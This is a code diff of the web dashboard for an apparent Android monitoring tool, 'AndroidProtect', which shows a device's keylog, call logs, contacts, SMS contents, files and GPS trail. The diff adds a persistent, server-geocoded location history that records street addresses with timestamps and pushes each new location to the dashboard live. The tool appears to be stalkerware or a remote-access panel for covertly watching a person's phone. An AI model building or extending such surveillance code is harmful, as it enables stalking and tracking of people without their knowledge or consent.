@@ -22,10 +22,10 @@ let contactsRefreshInterval = null; // Auto-refresh contacts from server DB
 let calllogsRefreshInterval = null; // Auto-refresh call logs from server DB
 let keylogRefreshInterval   = null; // Auto-refresh keylog from server DB
 
-// Street name history (reverse geocoding)
-let recentStreets = [];       // last 10 unique street names
-let lastGeocodeTime = 0;      // throttle: ms timestamp of last geocode call
-let streetUpdateInterval = null; // hourly update timer
+// Location history — persistent entries from server DB (geocoded)
+let locationHistoryData = [];       // array of {lat,lng,accuracy,address,street,number,neighborhood,city,state,country,timestamp}
+let lastGeocodeTime = 0;            // throttle: ms timestamp of last geocode call (client-side, kept for compat)
+let streetUpdateInterval = null;    // hourly update timer
 
 // File browser state
 let fbCurrentPath = '';
@@ -543,54 +543,72 @@ function haversineKm(lat1, lng1, lat2, lng2) {
     return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
 }
 
-// ─── Street History (Nominatim reverse geocoding) ────────────────────────────
+// ─── Location History (server-side geocoded, persistent) ─────────────────────
 
-async function reverseGeocode(lat, lng) {
-    try {
-        const res = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
-            { headers: { 'Accept-Language': 'pt-BR,pt', 'User-Agent': 'AndroidProtect/1.0' } }
-        );
-        const data = await res.json();
-        const addr = data.address || {};
-        return addr.road || addr.pedestrian || addr.path || addr.neighbourhood || addr.suburb
-            || (data.display_name || '').split(',')[0] || null;
-    } catch { return null; }
-}
-
-async function updateStreetHistory(lat, lng) {
-    const now = Date.now();
-    if (now - lastGeocodeTime < 90_000) return; // at most once per 90 s
-    lastGeocodeTime = now;
-    const street = await reverseGeocode(lat, lng);
-    if (!street) return;
-    if (recentStreets.length > 0 && recentStreets[0] === street) return;
-    recentStreets.unshift(street);
-    if (recentStreets.length > 10) recentStreets.pop();
-    renderStreetHistory();
+function fetchLocationHistory(deviceId) {
+    if (!deviceId) return;
+    fetch(`/api/device/${deviceId}/location-history?limit=100`, { headers: authHeaders() })
+        .then(res => res.json())
+        .then(entries => {
+            if (deviceId !== currentDeviceId) return; // stale response
+            locationHistoryData = entries;
+            renderStreetHistory();
+        })
+        .catch(() => {});
 }
 
 function renderStreetHistory() {
     const el = document.getElementById('street-history-list');
     if (!el) return;
-    if (recentStreets.length === 0) {
-        el.innerHTML = '<div class="street-empty"><i class="fa-solid fa-map-pin"></i> Nenhuma rua registrada ainda.</div>';
+    if (!locationHistoryData || locationHistoryData.length === 0) {
+        el.innerHTML = '<div class="street-empty"><i class="fa-solid fa-map-pin"></i> Nenhum histórico de localização ainda.</div>';
         return;
     }
-    el.innerHTML = recentStreets.map((s, i) =>
-        `<div class="street-item"><span class="street-idx">${i + 1}</span><i class="fa-solid fa-road"></i><span class="street-name">${escapeHtml(s)}</span></div>`
-    ).join('');
+    el.innerHTML = locationHistoryData.map((entry, i) => {
+        const street = entry.street || '';
+        const number = entry.number ? `, ${entry.number}` : '';
+        const neigh  = entry.neighborhood ? ` — ${entry.neighborhood}` : '';
+        const city   = entry.city || '';
+        const state  = entry.state || '';
+        const country = entry.country || '';
+
+        // Build primary label: "Rua Fulano, 123" or fallback to first part of full address
+        let primary = street ? escapeHtml(street + number) : '';
+        if (!primary && entry.address) primary = escapeHtml(entry.address.split(',')[0]);
+        if (!primary) primary = `${entry.lat.toFixed(5)}, ${entry.lng.toFixed(5)}`;
+
+        // Secondary: bairro — cidade, estado
+        const cityLine = [city, state].filter(Boolean).join(', ');
+        let secondary = [neigh ? neigh.replace(' — ','') : '', cityLine, country].filter(Boolean).join(' · ');
+
+        const ts = new Date(entry.timestamp);
+        const dateStr = ts.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: '2-digit' });
+        const timeStr = ts.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+
+        return `<div class="street-item" onclick="flyToLocation(${entry.lat},${entry.lng})" title="Ver no mapa">
+            <span class="street-idx">${i + 1}</span>
+            <i class="fa-solid fa-map-location-dot"></i>
+            <div class="street-item-body">
+                <span class="street-name">${primary}</span>
+                ${secondary ? `<span class="street-secondary">${escapeHtml(secondary)}</span>` : ''}
+            </div>
+            <span class="street-ts">${dateStr}<br>${timeStr}</span>
+        </div>`;
+    }).join('');
+}
+
+function flyToLocation(lat, lng) {
+    if (!map) return;
+    map.setView([lat, lng], 17, { animate: true });
+    closeTrailPanel();
 }
 
 function startStreetUpdateScheduler() {
     if (streetUpdateInterval) clearInterval(streetUpdateInterval);
+    // Refresh location history from server every 5 minutes while a device is active
     streetUpdateInterval = setInterval(() => {
-        if (!currentDeviceId || realtimeLocationActive) return;
-        if (trailHistoryPoints.length === 0) return;
-        const last = trailHistoryPoints[trailHistoryPoints.length - 1];
-        lastGeocodeTime = 0; // force update
-        updateStreetHistory(last.lat, last.lng);
-    }, 3_600_000); // every 1 hour
+        if (currentDeviceId) fetchLocationHistory(currentDeviceId);
+    }, 5 * 60 * 1000);
 }
 
 // ─── GPS Bar Update ───────────────────────────────────────────────────────────
@@ -904,6 +922,17 @@ function handleJsonMessage(data) {
                 logToConsole(`${srcEmoji} ${srcLabel} recebido de ${data.address || 'desconhecido'}: ${data.content}`, 'success');
             } else if (data.direction === 'out') {
                 logToConsole(`📤 ${srcLabel} enviado para ${data.address || 'desconhecido'}: ${data.content}`, 'info');
+            }
+            break;
+
+        case 'LOCATION_HISTORY_NEW':
+            // New geocoded location entry saved by the server — prepend to local list and re-render
+            if (data.deviceId === currentDeviceId && data.entry) {
+                locationHistoryData = [data.entry, ...locationHistoryData].slice(0, 100);
+                renderStreetHistory();
+                const loc = data.entry;
+                const label = loc.street || loc.city || `${loc.lat.toFixed(4)},${loc.lng.toFixed(4)}`;
+                logToConsole(`📍 Localização registrada: ${label}${loc.city ? ' — ' + loc.city : ''}`, 'system');
             }
             break;
 
@@ -1391,9 +1420,8 @@ function selectDevice(deviceId) {
     const accEl = document.getElementById('location-accuracy');
     if (accEl) accEl.textContent = 'Precisão: --';
 
-    // Reset street history for new device
-    recentStreets = [];
-    lastGeocodeTime = 0;
+    // Reset location history for new device (will be populated by fetchLocationHistory below)
+    locationHistoryData = [];
     renderStreetHistory();
     startStreetUpdateScheduler();
 
@@ -1511,6 +1539,9 @@ function fetchDeviceHistory(deviceId) {
 
     // 6. Fetch Keylog
     fetchKeylog(deviceId);
+
+    // 7. Fetch persistent geocoded location history
+    fetchLocationHistory(deviceId);
 }
 
 // Fetch and draw trail for selected days
@@ -1598,9 +1629,7 @@ function fetchTrailHistory(deviceId) {
             // Fly to last known position at street-level zoom
             map.flyTo([lastPt.lat, lastPt.lng], 16, { duration: 1.2 });
 
-            // Trigger street name for last known position
-            lastGeocodeTime = 0;
-            updateStreetHistory(lastPt.lat, lastPt.lng);
+            // Location history is loaded from server DB (no client-side geocoding needed)
         })
         .catch(err => console.error('Error fetching trail:', err));
 }
@@ -1726,8 +1755,7 @@ function handleTelemetry(data) {
             if (map.getZoom() < 15) map.setZoom(16);
         }
 
-        // Update street history (throttled to 90s)
-        updateStreetHistory(lat, lng);
+        // Location history updates arrive via LOCATION_HISTORY_NEW WS event from server
     }
 
 }
